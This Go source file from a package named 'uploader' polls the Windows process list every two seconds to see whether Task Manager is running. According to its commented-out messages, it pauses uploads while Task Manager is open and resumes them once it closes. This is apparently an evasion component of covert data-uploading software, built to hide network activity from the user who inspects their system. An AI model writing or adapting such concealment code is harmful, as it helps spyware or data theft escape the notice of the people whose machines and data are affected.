package uploader

import (
	"strings"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

func StartTaskManagerDetector() { // 注意：不再需要传 conn 参数！
	SafeGo(func() {
		for {
			running := isTaskManagerRunning()

			if running && !TaskmgrRunning.Load() {
				TaskmgrRunning.Store(true)
				// NotifyServer("检测到任务管理器 → 暂停上传", nil)
			} else if !running && TaskmgrRunning.Load() {
				TaskmgrRunning.Store(false)
				// NotifyServer("任务管理器已关闭 → 恢复上传", nil)
			}

			time.Sleep(2 * time.Second)
		}
	})
}

var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
)

var (
	procCreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
	procProcess32First           = kernel32.NewProc("Process32FirstW")
	procProcess32Next            = kernel32.NewProc("Process32NextW")
	procCloseHandle              = kernel32.NewProc("CloseHandle")
)

const (
	TH32CS_SNAPPROCESS = 0x00000002
)

type PROCESSENTRY32 struct {
	Size            uint32
	CntUsage        uint32
	ProcessID       uint32
	DefaultHeapID   uintptr
	ModuleID        uint32
	CntThreads      uint32
	ParentProcessID uint32
	PcPriClassBase  int32
	Flags           uint32
	ExeFile         [syscall.MAX_PATH]uint16
}

// 3. 检测函数
func isTaskManagerRunning() bool {
	snapshot, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPPROCESS, 0)
	if snapshot == uintptr(syscall.InvalidHandle) {
		return false
	}
	defer procCloseHandle.Call(snapshot)

	var pe PROCESSENTRY32
	pe.Size = uint32(unsafe.Sizeof(pe))

	r, _, _ := procProcess32First.Call(snapshot, uintptr(unsafe.Pointer(&pe)))
	if r == 0 {
		return false
	}

	for {
		name := windows.UTF16ToString(pe.ExeFile[:])
		if strings.EqualFold(name, "Taskmgr.exe") {
			return true
		}
		r, _, _ = procProcess32Next.Call(snapshot, uintptr(unsafe.Pointer(&pe)))
		if r == 0 {
			break
		}
	}
	return false
}
